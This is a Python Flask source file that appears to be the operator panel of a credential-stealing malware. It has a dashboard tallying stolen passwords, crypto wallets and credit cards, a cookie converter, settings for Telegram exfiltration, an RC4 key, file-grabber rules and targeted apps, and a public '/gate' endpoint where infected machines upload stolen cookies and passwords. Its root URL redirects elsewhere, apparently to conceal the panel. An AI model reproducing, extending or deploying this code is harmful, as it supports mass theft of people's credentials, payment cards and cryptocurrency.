#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Coded by L1ghtM3n@protonmail.com
# Лимер(ака лайтмен) лох:)

# Import modules
from datetime import timedelta
from flask import \
    Flask, session, render_template, redirect, url_for
# Import packages
from core.models.reports import Report
from core.models.country import GetCountryStatistics
from core.modules.sorter import SortReports
from core.modules.searcher import SearchReports
from core.modules.grabber import GetGrabberRules
from core.modules.targets import GetAllTargetApps
from core.modules.encryption import GetEncryptionKey
from core.modules.telegram import GetTelegramCredentials
from core.manager.api.public import public_api_handler
from core.manager.api.private import \
    login_required, is_client_authorized, private_api_handler

# Create Flask application
app = Flask(__name__)
app.secret_key = b"hZ=@p33P&+Zt@F8E"  # Session crypt key
app.permanent_session_lifetime = timedelta(days=3)  # Session expire time

# Redirect
@app.route("/")
def index():
    return redirect("http://www.staggeringbeauty.com", code=302)

# Login page
@app.route("/login")
def login():
    if is_client_authorized() is True:
        return redirect(url_for("dashboard"), code=302)
    # Render page
    return render_template("login.html")

# Dashboard 
# Sort reports (sort_option=date/count/country, reverse=1/0)
# Find domains (search_domains=paypal.com, blockchain.com)
@app.route("/dashboard")
@login_required
def dashboard():
    # Get all reports for current user
    reports = Report.GetReports(session["account"]["username"])
    # Sort and Search
    reports = SortReports(SearchReports(reports))
    # Get counter values
    count_wallets = sum(map(lambda r: r.counter["wallets"], reports))
    count_passwords = sum(map(lambda r: r.counter["passwords"], reports))
    count_credit_cards = sum(map(lambda r: r.counter["credit_cards"], reports))
    # Render page
    return render_template("dashboard.html",
            username=session["account"]["username"],
            counter_reports=len(reports),
            counter_wallets=count_wallets,
            counter_passwords=count_passwords,
            counter_credit_cards=count_credit_cards,
            reports=reports,
        )

# Statistics
@app.route("/statistics")
@login_required
def statistics():
    # Get countries statistics
    reports = Report.GetReports(session["account"]["username"])
    stats = GetCountryStatistics(reports)
    # Render page
    return render_template("statistics.html", 
            username=session["account"]["username"],
            stats=stats,
            logs_count=len(reports),
        )

# Cookies converter
@app.route("/converter")
@login_required
def converter():
    return render_template("converter.html",
        username=session["account"]["username"],
    )

# Settings
@app.route("/settings")
@login_required
def settings():
    usr = session["account"]["username"]
    token, ids = GetTelegramCredentials(usr)
    rules = GetGrabberRules(usr)
    return render_template("settings.html",
        username=usr,
        telegram_token=token,
        rc4_key=GetEncryptionKey(usr),
        ids_string=", ".join(ids),
        target_apps_options=GetAllTargetApps(usr),
        # Grabber
        table_paths=enumerate(rules["paths"]),
        extensions_area=", ".join(rules["extensions"]),
        max_file_size=rules["max_size"],
    )


""" Rest API router 
    1. register (username, password)    - Register new user on server
    2. unregister [AUTH REQUIRED]       - Delete account and reports
    3. login (username, password)       - Login to user (Create session)
    4. logout [AUTH REQUIRED]           - Logout from user (Close session)

    5. get_reports (id optional arg) [AUTH REQUIRED]     
                                              - Get user reports in JSON
    6. get_report  (id) [AUTH REQUIRED]       - Download zip report with passwords
    7. del_report  (id) [AUTH REQUIRED]       - Delete report from database and disk
    8. com_report  (id, text) [AUTH REQUIRED] - Comment report
    


    9. del_grabber_path (b64_value)       - Delete grabber path from table
   10. new_grabber_path (b64_value)       - Create grabber path for table
   11. set_grabber_extensions (json_list,
                                    size) - Set grabber extensions and max size
   12. change_password (old_password, new_password)
   13. change_encryption_key (rc4_key) - Change encryption key
   14. set_telegram_credentials (token, json_list)   - Save telegram settings
   15. set_apps_collection_configuration (json_list) - Save stealing apps list
"""
@app.route("/api/<function>", methods=["GET", "POST"])
def api(function):
    return private_api_handler(function)

    
""" Rest API router 
    1. fetch_options (username) - Get user options for new client
    2. send_report   (username, data, 
                      counter, information
                      cookies, passwords) - Upload new report
"""
@app.route("/gate/<function>", methods=["GET", "POST"])
def gate(function):
    return public_api_handler(function)

# Run http server
app.run(
    host="0.0.0.0",
    port=5050,
    debug=False,
)

